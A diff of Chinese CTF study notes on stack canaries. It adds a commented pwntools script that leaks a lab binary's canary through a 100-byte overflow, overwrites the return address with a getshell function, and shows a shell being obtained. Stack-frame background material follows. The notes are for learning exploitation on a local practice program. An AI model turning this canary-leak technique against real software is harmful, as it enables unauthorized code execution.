@@ -357,7 +357,7 @@ Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但�
 
 
 
-- 示例代码：
+- 示例代码：`gcc -m32 -no-pie -fstack-protector-all ex2.c -o ex2`
 
 ```c
 // ex2.c # 编译为 32bit 程序并关闭 PIE 保护 （并开启 NX，ASLR，Canary 保护）
@@ -391,6 +391,27 @@ int main(void) {
 
 
 
+![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_canary_function_demo.png)
+
+- 上图为IDA中显示的`vuln`函数的汇编指令。`var_C`为canary值
+
+```assembly
+; Stack of vuln ; Two special fields " r" and " s" represent return address and saved registers.
+-00000075                 db ? ; undefined
+-00000074 var_74          dd ?
+-00000070 buf             db 100 dup(?)           ; string(C)
+-0000000C var_C           dd ? ; 这个就是canary值 # 4 byte
+-00000008                 db ? ; undefined
+-00000007                 db ? ; undefined
+-00000006                 db ? ; undefined
+-00000005                 db ? ; undefined
+-00000004 var_4           dd ? ; 原本寄存器 ebx 的值
++00000000  s              db 4 dup(?) ; 从上图左边绿色的栈高度可以看出，s是原本的 ebp 的值
++00000004  r              db 4 dup(?) ; 函数的返回地址
++00000008
++00000008 ; end of stack variables
+```
+
 
 
 
@@ -407,28 +428,118 @@ from pwn import *
 
 context.binary = 'ex2'
 #context.log_level = 'debug'
-io = process('./ex2')
-
+io = process('./ex2') # pwnlib.tubes.process.process
 get_shell = ELF("./ex2").sym["getshell"]
-
-io.recvuntil("Hello Hacker!\n")
+print("get_shell:", type(get_shell), hex(get_shell)) # get_shell: <class 'int'> 0x80491b2
+ret = io.recvuntil("Hello Hacker!\n") # <class 'bytes'> b'Hello Hacker!\n'
 
 # leak Canary
-payload = "A"*100
-io.sendline(payload)
+payload = b"A" * 100 # buf[100] in .c, lead to stack overflow
+io.sendline(payload) # pwnlib.tubes.tube.tube.sendline # 这里会以\n结尾 即 0xa # 总共发送的payload长度为 101 bytes
+io.recvuntil("A" * 100) # recv output of printf(buf) in .c
+recv_v = io.recv(4)
 
-io.recvuntil("A"*100)
-Canary = u32(io.recv(4))-0xa
-log.info("Canary:"+hex(Canary))
+# 这里减去0xa是为了减去上面 io.sendline(payload) 最后的换行符，得到真正的 Canary
+Canary = u32(recv_v) - 0xa 
+log.info("Canary:" + hex(Canary))
 
 # Bypass Canary
-payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
+# as the stack shown in IDA: [buf 100byte]-[var_C]-[12byte]-[return_address]
+payload = b"\x90" * 100 + p32(Canary) + b"\x90" * 12 + p32(get_shell)
+payload = b"a" * 100 + p32(Canary) + b"a" * 12 + p32(get_shell)
 io.send(payload)
 
 io.recv()
 
 io.interactive()
 ```
+
+运行结果：调用`vuln`函数的返回值被覆盖为`getshell`的函数地址，可以获得所在主机的稳定shell
+
+ ```assembly
+ $ python canary.py
+ [*] '/home/kali/CTF/pwn/ex2'
+     Arch:     i386-32-little
+     RELRO:    Partial RELRO
+     Stack:    Canary found
+     NX:       NX enabled
+     PIE:      No PIE (0x8048000)
+ [+] Starting local process './ex2': pid 10221
+ get_shell: <class 'int'> 0x80491b2
+ [*] Canary:0xa5b35f00       ; 注意这里的值已经是将canary最后一个byte恢复成\x00后的原本的canary值了
+ [*] Switching to interactive mode
+ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$ ls  ; 这里已经获取了 shell 用ls测试
+ ex2.c  canary.py  core    ex2
+ ```
+
+ 如果使用`context.log_level = 'debug'`, `io.sendline(b"A" * 100)`之后的输出如下：
+
+ ```assembly
+ [DEBUG] Received 0x6c bytes:
+     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+     *
+     00000060  41 41 41 41  0a 5f b3 a5  10 a0 04 08               │AAAA│·_··│····│    ; 注意这里 0a 5f b3 a5 就是canary+0xa的值
+ ```
+
+ `0a 5f b3 a5`包含了101bytes的最后一个字符`\n`(0xa)，所在Linux系统为小端序，所以被覆盖的是canary的最后一个byte。而前面提到了canary值被设计以`\x00`结尾，所以这里需要将canary最后一个字节从`\x0a`恢复到原本的`\x00`
+
+
+
+##### one-by-one 爆破 Canary
+
+
+
+##### 劫持__stack_chk_fail 函数
+
+
+
+##### 覆盖 TLS 中储存的 Canary 值
+
+
+
+## 栈溢出
+
+![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/interger_registers.png)
+
+
+
+> 函数调用栈基础知识参考链接：
+>
+> https://www.cnblogs.com/clover-toeic/p/3755401.html C语言函数调用栈(一)
+>
+> https://www.cnblogs.com/clover-toeic/p/3756668.html C语言函数调用栈(二)
+
+- 函数调用栈的典型内存布局如下所示。包含caller和callee的栈帧布局
+
+![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_function_stack_caller_and_callee.jpg)
+
+- `m(%ebp)`表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)
+- 该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于`12(%ebp)` 处；第二，每个参数都是4字节大小(栈的粒度为4字节)
+- 函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分
+
+函数调用时入栈顺序： 实参N\~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1\~N
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
